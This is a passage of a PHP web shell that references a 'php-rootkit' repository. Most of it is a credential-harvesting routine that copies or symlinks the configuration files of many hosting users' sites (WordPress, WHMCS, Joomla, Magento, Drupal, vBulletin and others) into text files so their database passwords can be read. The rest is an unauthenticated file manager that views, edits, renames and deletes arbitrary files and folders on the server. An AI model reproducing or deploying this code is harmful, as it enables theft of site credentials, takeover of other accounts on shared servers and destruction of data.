copy('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
copy('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
symlink('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
symlink('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
copy('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
copy('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
symlink('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
symlink('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
copy('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
symlink('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
copy('/'.$home.'/'.$user.'/public_htm/conn.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/conn.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
copy('/var/www/wp-config.php','WORDPRESS.txt');
copy('/var/www/configuration.php','JOOMLA.txt');
copy('/var/www/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/config.php','OTHER.txt');
copy('/var/www/config/koneksi.php','OTHER.txt');
copy('/var/www/include/config.php','OTHER.txt');
copy('/var/www/connect.php','OTHER.txt');
copy('/var/www/config/connect.php','OTHER.txt');
copy('/var/www/include/connect.php','OTHER.txt');
copy('/var/www/html/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/configuration.php','JOOMLA.txt');
copy('/var/www/html/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/html/config.php','OTHER.txt');
copy('/var/www/html/config/koneksi.php','OTHER.txt');
copy('/var/www/html/include/config.php','OTHER.txt');
copy('/var/www/html/connect.php','OTHER.txt');
copy('/var/www/html/config/connect.php','OTHER.txt');
copy('/var/www/html/include/connect.php','OTHER.txt');
symlink('/var/www/wp-config.php','WORDPRESS.txt');
symlink('/var/www/configuration.php','JOOMLA.txt');
symlink('/var/www/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/config.php','OTHER.txt');
symlink('/var/www/config/koneksi.php','OTHER.txt');
symlink('/var/www/include/config.php','OTHER.txt');
symlink('/var/www/connect.php','OTHER.txt');
symlink('/var/www/config/connect.php','OTHER.txt');
symlink('/var/www/include/connect.php','OTHER.txt');
symlink('/var/www/html/wp-config.php','WORDPRESS.txt');
symlink('/var/www/html/configuration.php','JOOMLA.txt');
symlink('/var/www/html/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/html/config.php','OTHER.txt');
symlink('/var/www/html/config/koneksi.php','OTHER.txt');
symlink('/var/www/html/include/config.php','OTHER.txt');
symlink('/var/www/html/connect.php','OTHER.txt');
symlink('/var/www/html/config/connect.php','OTHER.txt');
symlink('/var/www/html/include/connect.php','OTHER.txt');
}
echo '<i><b><a href='.$folfig.'>./Done</a></b></i></center>';
 }
}
if($_GET['file']) {
  if(!$_GET['edit'] && !$_GET['delete'] && !$_GET['rename'] && !$_GET['rmfolder']) {
    echo "<textarea class='file'>".htmlspecialchars(file_get_contents($_GET[file]))."</textarea>";
  }
}
if($_GET['edit'] == "true") {
  echo "<form enctype='multipart/form-data' method='post'>
  <textarea class='file' name='edit_file'>".htmlspecialchars(file_get_contents($_GET['file']))."</textarea>
  <br><br>
  File Name : <input type='text' name='nama_f' value='$_GET[file]'>
  <br><br>
  <input type='submit' value='simpan berkas'>
  </form>
  ";
  if($_POST['edit_file']) {
    unlink($_GET['file']);
    $fedit = fopen($_POST['nama_f'], "w");
    if(fwrite($fedit, $_POST['edit_file'])) {
      fclose($fedit);
      echo "<script>alert('berhasil :)'); window.location = '?file=$_POST[nama_f]';</script>";
    } else {
      echo "<script>alert('gagal :('); window.location = '?file=$_POST[nama_f]';</script>";
    }
  }
}
if($_GET['rename'] == "true") {
  echo "<form enctype='multipart/form-data' method='post'>
  ".htmlspecialchars($_GET['file'])." [ To ] <input type='text' name='rename_file'>
  <input type='submit' value='Rename'>
  </form>
  ";
  if($_POST['rename_file']) {
    if(rename($_GET['file'], $_POST['rename_file'])) {
      echo "<script>alert('berhasil ubah nama :)'); window.location = '?';</script>";
    } else {
      echo "<script>alert('gagal ubah nama :('); window.location = '?';</script>";
    }
  }
}
if($_GET['rmfolder'] == "true") {
  if(rmdir($_GET['folder'])) {
    echo "<script>alert('folder berhasil di hapus :('); window.location = '?';</script>";
  } else {
    echo "<script>alert('folder gagal di hapus :('); window.location = '?';</script>";
  }
}
if($_GET['delete'] == "true") {
  if(unlink($_GET['file'])) {
    echo "<script>alert('berkas berhasil di hapus :)'); window.location = '?';</script>";
  } else {
    echo "<script>alert('berkas gagal di hapus :('); window.location = '?';</script>";
  }
}
if(empty($_GET)) {
?>
      <table width="100%">
        <tr>
          <th class="c">nama berkas</th>
          <th colspan="3" class="c">aksi</th>
        </tr>
<?php
  $scndir = scandir($dir);
  foreach($scndir as $sdir) {
    if(is_dir($dir."/".$sdir)) {
      echo "<tr>
      <td><a href='?d=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png'/> ".htmlspecialchars($sdir)."</a></td>
      <td>".w("$dir/$file",perms("$dir/$file"))."</td>
      <td><a href='?file=$dir/$sdir&rename=true'>ubah nama</a></td>
      <td><a href='?folder=$dir/$sdir&rmfolder=true'>hapus</a></td>
      </tr>
      ";
    }
    if(is_file($dir."/".$sdir)) {
      echo "<tr>
      <td><a href='?file=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/file.png'/> ".htmlspecialchars($sdir)."</a></td>
      <td>".w("$dir/$sdir",perms("$dir/$sdir"))."</td>
      <td><a href='?file=$dir/$sdir&edit=true'>edit</a></td>
      <td><a href='?file=$dir/$sdir&delete=true'>hapus</a></td>
      </tr>
      ";
    }
  }
?>
        </tr>
      </table>
<?php
}
?>
<hr><font color=red>D<font color=white>I<font color=red>A<font color=white>N <font color=lime> &#9829; <font color=red>H<font color=white>A<font color=red>N<font color=white>N<font color=red>A